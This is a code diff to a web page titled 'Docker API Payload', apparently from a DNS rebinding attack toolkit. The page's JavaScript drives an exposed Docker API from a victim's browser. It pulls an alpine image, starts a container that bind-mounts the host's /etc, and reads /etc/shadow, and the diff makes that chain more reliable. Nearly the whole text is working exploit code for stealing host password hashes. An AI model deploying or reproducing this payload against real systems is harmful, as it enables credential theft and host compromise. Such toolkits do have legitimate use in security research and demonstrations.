@@ -19,6 +19,8 @@ The default port for the Docker API is TCP 2376 (127.0.0.1:2376).
 	<script src="payload.js"></script>
 	<script>
 		function attack(headers, cookie, body) {
+			let data = null;
+			let containerID = null;
 			/* Send a POST request to /images/create to pull the latest alpine image */
 			fetch('/images/create?fromImage=alpine:latest', {
 					method: 'POST'
@@ -34,9 +36,10 @@ The default port for the Docker API is TCP 2376 (127.0.0.1:2376).
 						body: '{"Cmd":["cat","/tmp/etc/shadow"],"Image":"alpine","HostConfig":{"Binds":["/etc/:/tmp/etc"]}}'
 					})
 				})
+				.then(responseOKOrFail("Could not submit a request to create a container (/containers/create)"))
 				.then(function (response) {
-					const data = JSON.parse(response);
-					const containerID = data.Id;
+					data = JSON.parse(response);
+					containerID = data.Id;
 
 					if (!containerID) {
 						throw new Error('Could not create container: ' + response);
@@ -47,21 +50,23 @@ The default port for the Docker API is TCP 2376 (127.0.0.1:2376).
 						method: 'POST'
 					})
 				})
+				.then(responseOKOrFail("Could not submit a request to start the container (/containers/<ID>/start)"))
 				.then(function (response) {
 					// response of the /start API call is empty
 					return fetch("/containers/" + containerID + "/attach?stderr=1&stdout=1&logs=1", {
 						method: 'POST'
 					})
 				})
+				.then(responseOKOrFail("Could not submit a request to attach to the container (/containers/<ID>/attach)"))
 				.then(function (response) { // we successfully received the server response
 					console.log(`Server response: ${response}.`);
 				})
-				.catch(e => console.log(`Error using the Docker API: #{e}`));
+				.catch(e => console.log(`Error using the Docker API: ${e}`));
 		}
 	</script>
 </head>
 
-<body onload="begin('/')" )>
+<body onload="begin('/version')" )>
 	<h3>Docker API Payload</h3>
 	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 </body>
